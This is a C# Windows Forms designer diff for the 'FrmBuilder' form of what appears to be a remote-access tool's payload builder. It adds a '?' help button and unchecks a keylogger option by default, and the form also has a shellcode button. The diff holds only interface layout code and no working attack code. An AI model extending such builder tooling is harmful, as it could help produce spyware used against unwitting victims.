@@ -157,6 +157,7 @@ namespace Pulsar.Server.Forms
             label14 = new System.Windows.Forms.Label();
             chkKeylogger = new System.Windows.Forms.CheckBox();
             btnShellcode = new System.Windows.Forms.Button();
+            button1 = new System.Windows.Forms.Button();
             ((System.ComponentModel.ISupportInitialize)picUAC2).BeginInit();
             ((System.ComponentModel.ISupportInitialize)picUAC1).BeginInit();
             contextMenuStrip.SuspendLayout();
@@ -1258,8 +1259,6 @@ namespace Pulsar.Server.Forms
             // chkKeylogger
             // 
             chkKeylogger.AutoSize = true;
-            chkKeylogger.Checked = true;
-            chkKeylogger.CheckState = System.Windows.Forms.CheckState.Checked;
             chkKeylogger.Location = new System.Drawing.Point(20, 21);
             chkKeylogger.Name = "chkKeylogger";
             chkKeylogger.Size = new System.Drawing.Size(156, 17);
@@ -1278,12 +1277,23 @@ namespace Pulsar.Server.Forms
             btnShellcode.UseVisualStyleBackColor = true;
             btnShellcode.Click += btnShellcode_Click;
             // 
+            // button1
+            // 
+            button1.Location = new System.Drawing.Point(253, 390);
+            button1.Name = "button1";
+            button1.Size = new System.Drawing.Size(19, 23);
+            button1.TabIndex = 3;
+            button1.Text = "?";
+            button1.UseVisualStyleBackColor = true;
+            button1.Click += button1_Click;
+            // 
             // FrmBuilder
             // 
             AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
             AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
             BackColor = System.Drawing.SystemColors.Control;
             ClientSize = new System.Drawing.Size(535, 424);
+            Controls.Add(button1);
             Controls.Add(btnShellcode);
             Controls.Add(builderTabs);
             Controls.Add(btnBuild);
@@ -1427,5 +1437,6 @@ namespace Pulsar.Server.Forms
         public System.Windows.Forms.ComboBox comboBox1;
         private System.Windows.Forms.Label label15;
         public System.Windows.Forms.CheckBox checkBox2;
+        private System.Windows.Forms.Button button1;
     }
 }
